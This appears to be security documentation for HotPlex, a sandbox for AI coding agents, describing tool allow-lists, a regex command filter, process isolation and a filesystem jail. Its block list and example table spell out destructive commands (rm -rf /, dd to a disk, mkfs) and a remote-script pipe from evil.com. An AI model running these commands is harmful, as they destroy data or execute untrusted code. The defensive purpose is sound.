# Security Guide

## Security Model Overview

HotPlex implements defense-in-depth security with multiple layers:

![Security Layers](/images/security-layers.svg)

---

## The Four Security Layers

### Layer 1: Tool Governance

Control what the agent can do by restricting available tools:

```go
opts := hotplex.EngineOptions{
    // Whitelist: only these tools can be used
    AllowedTools: []string{"Bash", "Read", "Edit", "FileSearch"},
    
    // Blacklist: these tools are forbidden
    DisallowedTools: []string{"Shell", "Glob", "Grep"},
}
```

### Layer 2: WAF (Web Application Firewall)

Regex-based command filtering blocks dangerous patterns:

```go
// Default blocked patterns (configurable)
var DefaultBlockedPatterns = []string{
    `rm\s+-rf\s+/`,
    `dd\s+if=`,
    `mkfs\.`,
    `>:*/dev/sd`,
    `curl\s+.*\|\s*sh`,
    `wget\s+.*\|\s*sh`,
}
```

> [!TIP]
> Custom WAF rules can be added via configuration.

### Layer 3: Process Isolation (PGID)

Each session runs in an isolated process group:

```
Process Tree:
hotplexd (PID 1000)
  └── session-abc (PGID 1001)
        └── claude (PID 1002)
```

**Key behaviors:**
- `SIGKILL` sent to PGID ensures all child processes terminate
- Prevents orphaned daemons
- Prevents zombie processes

### Layer 4: Filesystem Jail

Restrict agent file access to specific directories:

```go
cfg := &hotplex.Config{
    // Agent can ONLY access this directory
    WorkDir: "/project/sandbox",
    
    // Optionally allow additional paths
    DangerAllowPaths: []string{
        "/project/sandbox/src",
        "/project/sandbox/tests",
    },
}
```

---

## WAF Configuration

### Default Blocked Commands

| Pattern | Blocks | Example |
|---------|--------|---------|
| `rm -rf /` | Recursive delete from root | `rm -rf /` |
| `dd if=` | Raw disk write | `dd if=/dev/zero of=/dev/sda` |
| `mkfs` | Filesystem creation | `mkfs.ext4 /dev/sdb` |
| `>*/dev/*` | Device writing | `cat > /dev/sda` |
| `curl \| sh` | Remote script execution | `curl http://evil.com/script \| sh` |

### Custom WAF Rules

```go
// Add custom blocked patterns
customWAF := []string{
    `pip\s+install`,
    `npm\s+install\s+-g`,
    `composer\s+require`,
}

// Apply to engine
opts := hotplex.EngineOptions{
    CustomBlockedPatterns: customWAF,
}
```

### Bypass Mode (Development Only!)

> [!WARNING]
> Never use bypass mode in production!

```go
// Set admin token
opts := hotplex.EngineOptions{
    AdminToken: "dev-secret-token",
}

// Later, enable bypass (DANGEROUS!)
engine.SetDangerBypassEnabled("dev-secret-token", true)
```

---

## Security Checklist

Before deploying to production:

- [ ] **Tool Whitelist**: Restrict to minimum required tools
- [ ] **WorkDir**: Set to dedicated sandbox directory
- [ ] **Idle Timeout**: Auto-cleanup after inactivity
- [ ] **Logging**: Enable audit logs for compliance
- [ ] **TLS**: Run behind reverse proxy with HTTPS
- [ ] **Authentication**: Enable API key or OAuth
- [ ] **Network**: Restrict access via firewall

---

## Known Limitations

### What HotPlex Does NOT Protect Against

| Threat | Mitigation |
|--------|------------|
| Malicious code in WorkDir | Use isolated VM/container |
| Social engineering | User education |
| Credential theft | Rotate secrets regularly |
| DDoS | Rate limiting + upstream protection |

### What HotPlex Does NOT Provide

- **Virus scanning**: Scan files externally before processing
- **Data encryption at rest**: Use encrypted filesystems
- **Authentication delegation**: Integrate with your identity provider

---

## Security Events

HotPlex emits security-related events via hooks:

```go
// Register security event handler
engine.OnHook("security_blocked", func(event Event) error {
    log.Printf("Blocked: %s - %s", event.SessionID, event.Data)
    return nil
})
```

### Event Types

| Event | Description |
|-------|-------------|
| `security_blocked` | Command blocked by WAF |
| `session_violation` | WorkDir boundary violation |
| `tool_restricted` | Blocked tool was invoked |

---

## Related Topics

- [Architecture](/guide/architecture) - System design
- [State Management](/guide/state) - Session security
- [Observability](/guide/observability) - Audit logging
- [Deployment](/guide/deployment) - Production hardening
